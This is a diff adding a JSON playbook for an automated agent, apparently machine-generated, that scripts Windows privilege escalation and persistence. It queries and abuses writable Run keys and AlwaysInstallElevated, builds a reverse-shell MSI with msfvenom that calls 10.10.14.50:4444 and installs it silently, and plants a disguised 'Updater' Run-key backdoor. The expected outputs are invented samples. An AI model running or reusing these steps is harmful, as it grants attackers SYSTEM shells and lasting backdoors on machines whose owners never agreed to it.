@@ -1,0 +1,137 @@
+{
+  "name": "windows_registry_autorun_privesc",
+  "description": "Registry persistence and AutoRun privilege escalation via writable registry keys",
+  "pattern": "registry.*persist|autorun|hklm.*run|alwaysinstallelevated",
+  "parameters": [
+    "registry_key",
+    "payload_path"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "reg",
+        "args": [
+          "query",
+          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityHealth    REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe\n    BackupTool        REG_SZ           C:\\Program Files\\Backup\\backup.exe\n    VMware User Process    REG_SZ      \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr\n\nAutoRun programs (execute on login):\n  SecurityHealth: Windows Defender\n  BackupTool: Custom backup application\n  VMware User Process: VMware Tools\n\nExploitation:\n  If HKLM\\...\\Run is writable by current user:\n    - Add malicious exe to Run key\n    - Executes as SYSTEM or admin on next login\n  \nCheck permissions:\n  accesschk.exe -wvu HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "C:\\Tools\\accesschk.exe /accepteula -wvu \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "AccessChk v6.14 - Reports effective permissions\nCopyright (C) 2006-2021 Mark Russinovich\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW BUILTIN\\Administrators\n  RW NT AUTHORITY\\SYSTEM\n  RW BUILTIN\\Users\n     KEY_ALL_ACCESS\n\nPermissions:\n  Users group: KEY_ALL_ACCESS - VULNERABLE!\n\nExploitable: Regular users can write to Run key!\n\nExploitation:\n  reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\Temp\\backdoor.exe\"\n  \nBackdoor executes on next admin/SYSTEM login"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "reg",
+        "args": [
+          "query",
+          "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n\nAlso check HKCU:\nC:\\> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\n\nHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer  \n    AlwaysInstallElevated    REG_DWORD    0x1\n\nBOTH registry keys set to 1 - VULNERABLE!\n\nAlwaysInstallElevated privilege escalation:\n  - MSI installers run with SYSTEM privileges\n  - Any user can install MSI\n  - Create malicious MSI with payload\n  - Install as low-privilege user\n  - Payload executes as SYSTEM\n\nExploitation:\n  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f msi -o backdoor.msi\n  msiexec /quiet /qn /i C:\\Temp\\backdoor.msi"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f msi -o C:\\Temp\\backdoor.msi"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of msi file: 159744 bytes\nSaved as: C:\\Temp\\backdoor.msi\n\nMalicious MSI created!\n  Payload: windows/x64/shell_reverse_tcp\n  LHOST: 10.10.14.50\n  LPORT: 4444\n  Size: 159KB\n\nInstallation (as low-priv user):\n  msiexec /quiet /qn /i C:\\Temp\\backdoor.msi\n\nFlags:\n  /quiet: No UI\n  /qn: No user interaction\n  /i: Install\n\nListener:\n  nc -lvnp 4444\n\nOn install: Reverse shell as SYSTEM"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "reg",
+        "args": [
+          "add",
+          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "/v",
+          "Updater",
+          "/t",
+          "REG_SZ",
+          "/d",
+          "C:\\Windows\\Temp\\payload.exe",
+          "/f"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "The operation completed successfully.\n\nRegistry key added:\n  Key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  Value: Updater\n  Data: C:\\Windows\\Temp\\payload.exe\n\nPersistence achieved!\n  Payload executes on every user login\n  Runs in user context (not SYSTEM unless admin logs in)\n\nVerify:\n  reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nDelete:\n  reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /f\n\nAlternative locations:\n  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (current user)\n  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce (run once)\n  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices (deprecated)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "Get-ChildItem 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' | ForEach-Object {Get-Acl $_.PSPath | Select-Object Path, Owner, AccessToString}"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Path                                                    Owner                   AccessToString\n----                                                    -----                   --------------\nMicrosoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACH... BUILTIN\\Administrators  NT AUTHORITY\\SYSTEM Allow FullControl...\n                                                                                BUILTIN\\Administrators Allow FullControl...\n                                                                                BUILTIN\\Users Allow ReadKey...\n\nPermission analysis:\n  Owner: Administrators\n  SYSTEM: FullControl\n  Administrators: FullControl\n  Users: ReadKey only (safe)\n\nNot exploitable - Users can only read, not write\n\nCheck other Run keys:\n  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n  HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\n  HKCU keys (always writable by user)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "cmd",
+        "args": [
+          "/c",
+          "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\" /s | findstr \"ImagePath\" | findstr /i \"\\Users\""
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CustomService\n    ImagePath    REG_EXPAND_SZ    C:\\Users\\Public\\Tools\\service.exe\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DevService\n    ImagePath    REG_SZ           C:\\Users\\developer\\Apps\\devservice.exe\n\nServices with ImagePath in writable locations:\n  CustomService: C:\\Users\\Public\\Tools\\\n  DevService: C:\\Users\\developer\\Apps\\\n\nExploitation:\n  1. Check if path is writable: icacls \"C:\\Users\\Public\\Tools\"\n  2. If writable: replace service.exe with malicious binary\n  3. Restart service or reboot\n  4. Service runs malicious binary as SYSTEM\n\nQuery service details:\n  sc qc CustomService\n  \nSee if runs as SYSTEM or other privileged account"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
